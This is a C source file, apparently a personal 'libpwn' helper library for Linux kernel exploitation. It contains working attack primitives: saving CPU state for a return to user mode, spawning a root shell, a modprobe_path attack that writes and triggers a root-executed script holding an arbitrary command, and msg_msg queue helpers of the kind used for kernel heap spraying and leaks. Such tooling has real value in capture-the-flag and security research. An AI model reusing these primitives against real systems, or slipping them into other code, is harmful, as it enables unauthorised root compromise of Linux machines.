#include "libpwn.h"

void _pause_(const char *msg) {
    printf("[PAUSE] %s\n", msg);
    getchar();
}

void success(const char *msg) {
    printf("[SUCCESS] %s\n", msg);
}

void success2(const char *msg, u64 val) {
    printf("[SUCCESS] %s: %#lx\n", msg, val);
}

void info(const char *msg) {
    printf("[INFO] %s\n", msg);
}

void info2(const char *msg, u64 val) {
    printf("[INFO] %s: %#lx\n", msg, val);
}

void warn(const char *msg) {
    printf("[WARN] %s\n", msg);
}

void error(const char *msg) {
    printf("[ERROR] %s\n", msg);
}

void panic(const char *msg) {
    printf("[PANIC] ");
    perror(msg);
    exit(0x132);
}

unsigned long bswap(unsigned long val) {
    asm(
        "bswap %1;"
        : "=r" (val)
        : "r" (val));
}

void save_state() {
    __asm__(".intel_syntax noprefix;"
            "mov _proc_cs, cs;"
            "mov _proc_ss, ss;"
            "mov _proc_rsp, rsp;"
            "pushf;" // push rflags
            "pop _proc_rflags;"
            ".att_syntax");

    printf("[+] CS: 0x%lx, SS: 0x%lx, RSP: 0x%lx, RFLAGS: 0x%lx\n", _proc_cs, _proc_ss, _proc_rsp, _proc_rflags);
}

void spawn_shell() {
    puts("[+] Hello Userland!");
    int uid = getuid();
    if (uid == 0)
        printf("[+] UID: %d (root poggers)\n", uid);
    else {
        printf("[!] UID: %d (epic fail)\n", uid);
    }

    puts("[*] starting shell");
    system("/bin/sh");

    puts("[*] quitting exploit");
    exit(0); // avoid ugly segfault
}

void modprobe_attack(const char *cmd, const char *dummy_path, const char *devious_path) {
    printf("[SANITY] modprobe path: ");
    system("cat /proc/sys/kernel/modprobe");

    char buf[0x400] = {0};
    if (cmd == NULL) warn("modprobe_attack: cmd is NULL");
    if (dummy_path == NULL) dummy_path = DEFAULT_FAKE_MODPROBE_PATH;
    if (devious_path == NULL) devious_path = DEFAULT_DEVIOUS_MODPROBE_PATH;

    // snprintf(buf, sizeof(buf)-1, "echo -ne '\\xff\\xff\\xff\\xff' > %s", fake_path);
    // system(buf);

    printf("[WRITE] dummy modprobe: %s\n", dummy_path);
    int dummy_fd = open(dummy_path, O_CREAT|O_WRONLY, 0777);
    if (dummy_fd < 0) {
        error("open");
    }
    memset(buf, 0xff, 0x4);
    write(dummy_fd, buf, 0x4);
    close(dummy_fd);

    printf("[WRITE] devious modprobe: %s\n", devious_path);
    memset(buf, 0, sizeof(buf));
    snprintf(buf, sizeof(buf)-1, "echo '#!/bin/sh\n%s\n' > %s" , cmd, devious_path);
    system(buf);

    puts("[PERM] giving exec perm");
    memset(buf, 0, sizeof(buf));
    snprintf(buf, sizeof(buf)-1, "chmod 777 %s; chmod 777 %s", dummy_path, devious_path);
    system(buf);

    info("Run unknown file");
    system(dummy_path); // trigger modprobe
}

int create_msg_queue() {
    int ret = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
    if (ret < 0) panic("msgget");
    return ret;
}

void delete_msg_queue(int msqid) {
    if (msgctl(msqid, IPC_RMID, NULL) < 0) error("msgctl");
}

void send_msg(int msqid, size_t size, char *text) {
    msg_msg_buf *msg = (msg_msg_buf *)calloc(1, sizeof(long) + size + 1);
    if (msg == NULL) panic("send_msg: calloc");

    msg->mytpe = 1; // mtype (can be any positive integer)
    memcpy(msg->mtext, text, size);

    if (msgsnd(msqid, msg, size, 0x0) < 0) error("send_msg: msgsnd");
    free(msg);
}

msg_msg_buf* consume_msg(int msqid, size_t size) {
    msg_msg_buf *msg = (msg_msg_buf *)calloc(1, sizeof(long) + size + 1);
    if (msg == NULL) panic("consume_msg: calloc");

    if (msgrcv(msqid, msg, size, 0x0, MSG_NOERROR | IPC_NOWAIT) < 0) {
        error("consume_msg: msgrcv");
        return 0x0;
    }

    return msg;
}

msg_msg_buf* peek_msg(int msqid, size_t size) {
    msg_msg_buf *msg = (msg_msg_buf *)calloc(1, sizeof(long) + size + 1);
    if (msg == NULL) panic("consume_msg: calloc");

    if (msgrcv(msqid, msg, size, 0x0, MSG_NOERROR | IPC_NOWAIT | MSG_COPY) < 0) {
        error("consume_msg: msgrcv");
        return 0x0;
    }

    return msg;
}

void dump_hex(char *buf, size_t size) {
    for(int i = 0; i < size/8; i++) {
        printf("[*] buffer[%d]: 0x%lx\n", i, ((unsigned long *)buf)[i]);
    }
}

static void __attribute__((constructor)) init(void){
	setvbuf(stdout, NULL, _IONBF, 0);
}

